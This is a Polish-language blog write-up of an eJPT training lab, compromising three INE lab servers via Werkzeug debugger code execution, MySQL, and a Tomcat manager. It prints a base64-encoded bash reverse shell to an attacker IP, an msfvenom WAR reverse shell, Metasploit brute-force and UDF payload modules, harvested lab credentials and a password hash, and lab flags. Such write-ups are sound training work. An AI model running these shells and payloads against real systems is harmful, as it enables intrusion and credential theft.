<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Black-Box Penetration Test 3 | Mateusz Suszczyk</title>
<meta name="keywords" content="Linux, Easy, eJPT" />
<meta name="description" content="Lab rozwiązany podczas przygotowań do egzaminu eJPT.">
<meta name="author" content="Mateusz Suszczyk">
<link rel="canonical" href="https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-3/" />
<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.92.2" />
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Black-Box Penetration Test 3" />
<meta property="og:description" content="Lab rozwiązany podczas przygotowań do egzaminu eJPT." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-3/" />
<meta property="og:image" content="https://suszczyk.github.io/thumbnails/.jpg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-21T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-06-21T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/.jpg" />
<meta name="twitter:title" content="Black-Box Penetration Test 3"/>
<meta name="twitter:description" content="Lab rozwiązany podczas przygotowań do egzaminu eJPT."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://suszczyk.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Black-Box Penetration Test 3",
      "item": "https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-3/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Black-Box Penetration Test 3",
  "name": "Black-Box Penetration Test 3",
  "description": "Lab rozwiązany podczas przygotowań do egzaminu eJPT.",
  "keywords": [
    "Linux", "Easy", "eJPT"
  ],
  "articleBody": "Description Lab Environment In this lab environment, the user is going to get access to a Kali GUI instance. Three machines can be accessed using the tools installed on Kali on server1.ine.local, server2.ine.local and server3.ine.local.\nObjective: Attack all machines to retrieve the flags!\nTools The best tools for this lab are:\n cURL dirb Nmap Metasploit Framework A Web Browser  Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course, will dramatically reduce the benefits of a hands-on lab!\n Black-Box Penetration Test 3 - 21.06.2022 r. server1.ine.local Nmap root@INE:~# nmap -sC -sV server1.ine.local Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 16:42 IST Nmap scan report for server1.ine.local (192.255.191.3) Host is up (0.0000090s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Werkzeug httpd 0.9.6 (Python 2.7.13) |_http-title: Site doesnt have a title (text/plain; charset=utf-8). MAC Address: 02:42:C0:FF:BF:03 (Unknown) Podobnie jak w poprzednim boxie, mamy tutaj Werkzeug. Tym razem nie jest zabezpieczony pinem. Można zatem spróbować od razu z Command Execution. __import__('os').popen('whoami').read();. Jak widać pomyślnie.\nPierwsza maszyna poszła bardzo sprawnie.\nroot@INE:~# echo 'bash -c \"bash -i \u0026 /dev/tcp/192.211.54.2/9001 0\u00261\"'|base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjExLjU0LjIvOTAwMSAwPiYxIgo= __import__('os').popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjExLjU0LjIvOTAwMSAwPiYxIgo= | base64 -d | bash').read();\nNie widać na systemie żadnej flagi, ale sprawdziłem folder /home.\nNietypowo dużo użytkowników. Sprawdziłem również pliki. Tylko użytkownik auditor ma .bash_history.\nOkazało się, że .bash_history zawiera ciekawą linię zawierającą dane o drugim hoście.\nmysql -h 192.238.232.4 -u root -p fArFLP29UySm4bZj  server2.ine.local root@INE:~# nmap -sC -sV server2.ine.local Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 18:44 IST Nmap scan report for server2.ine.local (192.211.54.4) Host is up (0.000010s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 3306/tcp open mysql MySQL 5.5.62-0ubuntu0.14.04.1 | mysql-info: | Protocol: 10 | Version: 5.5.62-0ubuntu0.14.04.1 | Thread ID: 46 | Capabilities flags: 63487 | Some Capabilities: Support41Auth, Speaks41ProtocolOld, LongPassword, InteractiveClient, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, ODBCClient, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments | Status: Autocommit | Salt: qe(3i:$A\\.m\\d`6-}R`j |_ Auth Plugin Name: mysql_native_password MAC Address: 02:42:C0:D3:36:04 (Unknown) Przejrzałem internet pod kątem ewentualnych podatności tej wersji. Niestety nic konkretnego nie znalazłem, ale mam dane logowania z poprzedniego hosta.\nshow databases; use mysql; show tables; select * from user; Doczytałem, że mając dostęp do bazy MySQL, można spróbować wysłać payload m.in. przez Metasploit oraz moduł exploit/multi/mysql/mysql_udf_payload.\nflag 4c537c0dfd18bafdcd59f53c7015550e\n server3.ine.local root@INE:~# nmap -sC -sV server3.ine.local Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 17:55 IST Nmap scan report for server3.ine.local (192.255.191.5) Host is up (0.000010s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e1:c9:8e:a0:ca:07:1d:e9:65:06:f2:8e:cd:51:fa:76 (RSA) | 256 82:26:cc:66:66:5b:29:7a:82:85:95:c2:43:a0:d4:6a (ECDSA) |_ 256 a9:85:9f:da:86:52:af:8d:ca:43:39:89:fa:9c:59:11 (ED25519) 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-methods: |_ Potentially risky methods: PUT DELETE |_http-title: Site doesnt have a title (text/html). |_http-server-header: Apache-Coyote/1.1 MAC Address: 02:42:C0:FF:BF:05 (Unknown) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Zatem na porcie 8080 mamy Apache Tomcat 8.0.53\nBardzo pomocny jest poradnik od hacktricks. https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat\nPróbowałem proste hasła i loginy jednak nie przechodziły.\nKolejny punkt to sprawdzenie bruteforcem.\nmsfconsole use auxiliary/scanner/http/tomcat_mgr_login tomcat:s3cret\nI jest dostęp do panelu Tomcata.\nW tym momencie można uzyskać shell jako tomcat poprzez deploy pliku .war\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.238.232.2 LPORT=9090 -f war -o revshell.war http://server3.ine.local:8080/revshell/\nflag1 EBCFE35ACC27E0EA91CF3A5AB600BABE\nPonadto zdaje się, że “jesteśmy” w kontenerze Dockera.\nMamy na boxie użytkownika robert a co najciekawsze, mamy prawo odczytu do pliku /etc/shadow\n`robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::\nPróbowałem złamać hasło Hashcatem jednak jest zbyt silne. Postanowiłem poszukać czegoś w plikach. Folder domyślny tomcata ma ciekawe archiwum conf.tar.gz.\ntomcat@server3:~/conf$ find . find . . ./tomcat-users.xml ./context.xml ./catalina.properties ./catalina.policy ./web.xml ./tomcat-users.xsd ./logging.properties ./server.xml ./Catalina ./Catalina/localhost ./conf.tar.gz Po rozpakowaniu okazało się, że jest to backup folderu, ale w typowym pliku tomcat-users.xml są zapisane dane dostępowe.\ncat tomcat-users.xml  =\"tomcat\" password=\"s3cret\" roles=\"manager-gui,admin-gui\"/ =\"robert\" password=\"robert@1234567890!@#\" roles=\"manager-gui,admin-gui\"/  robert:robert@1234567890!@#\nflag2 EC2986081E84BB845541D5CC0BEE13B3\n Root na server3.ine.local Sprawdzając sudo -l widzimy coś nietypowego.\nrobert@server3:~$ sudo -l sudo -l Matching Defaults entries for robert on server3.ine.local: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOAD User robert may run the following commands on server3.ine.local: (root) NOPASSWD: /bin/ls https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/\nflag3 560648FC63F090A8CF776326DC13FAC7\n",
  "wordCount" : "688",
  "inLanguage": "en",
  "image":"https://suszczyk.github.io/thumbnails/.jpg","datePublished": "2022-06-21T00:00:00Z",
  "dateModified": "2022-06-21T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Mateusz Suszczyk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-3/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Mateusz Suszczyk",
    "logo": {
      "@type": "ImageObject",
      "url": "https://suszczyk.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
                    <span>Archiwum</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
                    <span>Kategorie</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/tags/" title="Tagi">
                    <span>Tagi</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/search/" title="Szukaj">
                    <span>Szukaj</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;»&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Black-Box Penetration Test 3
    </h1>
    <div class="post-meta"><span title='2022-06-21 00:00:00 +0000 UTC'>June 21, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Mateusz Suszczyk

</div>
  </header> 
<figure class="entry-cover"><img loading="lazy" src="https://suszczyk.github.io/thumbnails/.jpg" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#description" aria-label="Description">Description</a></li>
                <li>
                    <a href="#lab-environment" aria-label="Lab Environment">Lab Environment</a></li>
                <li>
                    <a href="#tools" aria-label="Tools">Tools</a></li>
                <li>
                    <a href="#black-box-penetration-test-3---21062022-r" aria-label="Black-Box Penetration Test 3 - 21.06.2022 r.">Black-Box Penetration Test 3 - 21.06.2022 r.</a><ul>
                        
                <li>
                    <a href="#server1inelocal" aria-label="server1.ine.local">server1.ine.local</a><ul>
                        
                <li>
                    <a href="#nmap" aria-label="Nmap">Nmap</a></li></ul>
                </li>
                <li>
                    <a href="#server2inelocal" aria-label="server2.ine.local">server2.ine.local</a></li>
                <li>
                    <a href="#server3inelocal" aria-label="server3.ine.local">server3.ine.local</a><ul>
                        
                <li>
                    <a href="#root-na-server3inelocal" aria-label="Root na server3.ine.local">Root na server3.ine.local</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h1>
<h1 id="lab-environment">Lab Environment<a hidden class="anchor" aria-hidden="true" href="#lab-environment">#</a></h1>
<p>In this lab environment, the user is going to get access to a Kali GUI instance. Three machines can be accessed using the tools installed on Kali on <a href="http://server1.ine.local/">server1.ine.local</a>, <a href="http://server2.ine.local/">server2.ine.local</a> and <a href="http://server3.ine.local/">server3.ine.local</a>.</p>
<p><strong>Objective:</strong> Attack all machines to retrieve the flags!</p>
<h1 id="tools">Tools<a hidden class="anchor" aria-hidden="true" href="#tools">#</a></h1>
<p>The best tools for this lab are:</p>
<ul>
<li>cURL</li>
<li>dirb</li>
<li>Nmap</li>
<li>Metasploit Framework</li>
<li>A Web Browser</li>
</ul>
<p><strong>Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course, will dramatically reduce the benefits of a hands-on lab!</strong></p>
<hr>
<h1 id="black-box-penetration-test-3---21062022-r">Black-Box Penetration Test 3 - 21.06.2022 r.<a hidden class="anchor" aria-hidden="true" href="#black-box-penetration-test-3---21062022-r">#</a></h1>
<h2 id="server1inelocal">server1.ine.local<a hidden class="anchor" aria-hidden="true" href="#server1inelocal">#</a></h2>
<h3 id="nmap">Nmap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# nmap -sC -sV server1.ine.local
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-06-21 16:42 IST
Nmap scan report <span style="color:#66d9ef">for</span> server1.ine.local <span style="color:#f92672">(</span>192.255.191.3<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.0000090s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 0.9.6 <span style="color:#f92672">(</span>Python 2.7.13<span style="color:#f92672">)</span>
|_http-title: Site doesnt have a title <span style="color:#f92672">(</span>text/plain; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
MAC Address: 02:42:C0:FF:BF:03 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
</code></pre></div><p>Podobnie jak w poprzednim boxie, mamy tutaj Werkzeug. Tym razem nie jest zabezpieczony pinem. Można zatem spróbować od razu z Command Execution. <code>__import__('os').popen('whoami').read();</code>. Jak widać pomyślnie.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621131535.png" alt=""  />
</p>
<p>Pierwsza maszyna poszła bardzo sprawnie.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# echo <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.211.54.2/9001 0&gt;&amp;1&#34;&#39;</span>|base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjExLjU0LjIvOTAwMSAwPiYxIgo<span style="color:#f92672">=</span>
</code></pre></div><p><code>__import__('os').popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjExLjU0LjIvOTAwMSAwPiYxIgo= | base64 -d | bash').read();</code></p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621131905.png" alt=""  />
</p>
<p>Nie widać na systemie żadnej flagi, ale sprawdziłem folder <code>/home</code>.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621152931.png" alt=""  />
</p>
<p>Nietypowo dużo użytkowników. Sprawdziłem również pliki. Tylko użytkownik <code>auditor</code> ma <code>.bash_history</code>.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621153126.png" alt=""  />
</p>
<p>Okazało się, że <code>.bash_history</code> zawiera ciekawą linię zawierającą dane o drugim hoście.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621153319.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql -h 192.238.232.4 -u root -p fArFLP29UySm4bZj
</code></pre></div><hr>
<h2 id="server2inelocal">server2.ine.local<a hidden class="anchor" aria-hidden="true" href="#server2inelocal">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# nmap -sC -sV server2.ine.local
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-06-21 18:44 IST
Nmap scan report <span style="color:#66d9ef">for</span> server2.ine.local <span style="color:#f92672">(</span>192.211.54.4<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.000010s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-info: 
|   Protocol: <span style="color:#ae81ff">10</span>
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: <span style="color:#ae81ff">46</span>
|   Capabilities flags: <span style="color:#ae81ff">63487</span>
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, LongPassword, InteractiveClient, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, ODBCClient, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: qe<span style="color:#f92672">(</span>3i:$A<span style="color:#ae81ff">\.</span>m<span style="color:#ae81ff">\d</span><span style="color:#e6db74">`</span>6-<span style="color:#f92672">}</span>R<span style="color:#e6db74">`</span>j
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:C0:D3:36:04 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
</code></pre></div><p>Przejrzałem internet pod kątem ewentualnych podatności tej wersji. Niestety nic konkretnego nie znalazłem, ale mam dane logowania z poprzedniego hosta.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="color:#66d9ef">show</span> <span style="color:#66d9ef">databases</span>;
<span style="color:#66d9ef">use</span> mysql;
<span style="color:#66d9ef">show</span> <span style="color:#66d9ef">tables</span>;
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span>;
</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621155336.png" alt=""  />
</p>
<p>Doczytałem, że mając dostęp do bazy <code>MySQL</code>, można spróbować wysłać payload m.in. przez <code>Metasploit</code> oraz moduł <code>exploit/multi/mysql/mysql_udf_payload</code>.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621165435.png" alt=""  />
</p>
<p>flag
<code>4c537c0dfd18bafdcd59f53c7015550e</code></p>
<hr>
<h2 id="server3inelocal">server3.ine.local<a hidden class="anchor" aria-hidden="true" href="#server3inelocal">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# nmap -sC -sV server3.ine.local
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-06-21 17:55 IST
Nmap scan report <span style="color:#66d9ef">for</span> server3.ine.local <span style="color:#f92672">(</span>192.255.191.5<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.000010s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> e1:c9:8e:a0:ca:07:1d:e9:65:06:f2:8e:cd:51:fa:76 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 82:26:cc:66:66:5b:29:7a:82:85:95:c2:43:a0:d4:6a <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> a9:85:9f:da:86:52:af:8d:ca:43:39:89:fa:9c:59:11 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesnt have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
|_http-server-header: Apache-Coyote/1.1
MAC Address: 02:42:C0:FF:BF:05 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>Zatem na porcie <code>8080</code> mamy <code>Apache Tomcat 8.0.53</code></p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621142726.png" alt=""  />
</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621143254.png" alt=""  />
</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621143038.png" alt=""  />
</p>
<p>Bardzo pomocny jest poradnik od <code>hacktricks</code>.
<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat</a></p>
<p>Próbowałem proste hasła i loginy jednak nie przechodziły.</p>
<p>Kolejny punkt to sprawdzenie bruteforcem.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621165709.png" alt=""  />
</p>
<p><code>tomcat:s3cret</code></p>
<p>I jest dostęp do panelu Tomcata.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621165928.png" alt=""  />
</p>
<p>W tym momencie można uzyskać shell jako <code>tomcat</code> poprzez deploy pliku .war</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.238.232.2 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9090</span> -f war -o revshell.war
</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621170743.png" alt=""  />
</p>
<p><code>http://server3.ine.local:8080/revshell/</code></p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621170833.png" alt=""  />
</p>
<p>flag1
<code>EBCFE35ACC27E0EA91CF3A5AB600BABE</code></p>
<p>Ponadto zdaje się, że &ldquo;jesteśmy&rdquo; w kontenerze <code>Dockera</code>.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621171146.png" alt=""  />
</p>
<p>Mamy na boxie użytkownika <code>robert</code> a co najciekawsze, mamy prawo odczytu do pliku <code>/etc/shadow</code></p>
<p>`robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::</p>
<p>Próbowałem złamać hasło <code>Hashcatem</code> jednak jest zbyt silne. Postanowiłem poszukać czegoś w plikach. Folder domyślny <code>tomcata</code> ma ciekawe archiwum <code>conf.tar.gz</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@server3:~/conf$ find .
find .
.
./tomcat-users.xml
./context.xml
./catalina.properties
./catalina.policy
./web.xml
./tomcat-users.xsd
./logging.properties
./server.xml
./Catalina
./Catalina/localhost
./conf.tar.gz
</code></pre></div><p>Po rozpakowaniu okazało się, że jest to backup folderu, ale w typowym pliku <code>tomcat-users.xml</code> są zapisane dane dostępowe.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat tomcat-users.xml
&lt;tomcat-users&gt;
        &lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tomcat&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;s3cret&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manager-gui,admin-gui&#34;</span>/&gt;
        &lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robert&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robert@1234567890!@#&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manager-gui,admin-gui&#34;</span>/&gt;
&lt;/tomcat-users&gt;
</code></pre></div><p><code>robert:robert@1234567890!@#</code></p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621180422.png" alt=""  />
</p>
<p>flag2
<code>EC2986081E84BB845541D5CC0BEE13B3</code></p>
<hr>
<h3 id="root-na-server3inelocal">Root na server3.ine.local<a hidden class="anchor" aria-hidden="true" href="#root-na-server3inelocal">#</a></h3>
<p>Sprawdzając <code>sudo -l</code> widzimy coś nietypowego.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">robert@server3:~$ sudo -l
sudo -l
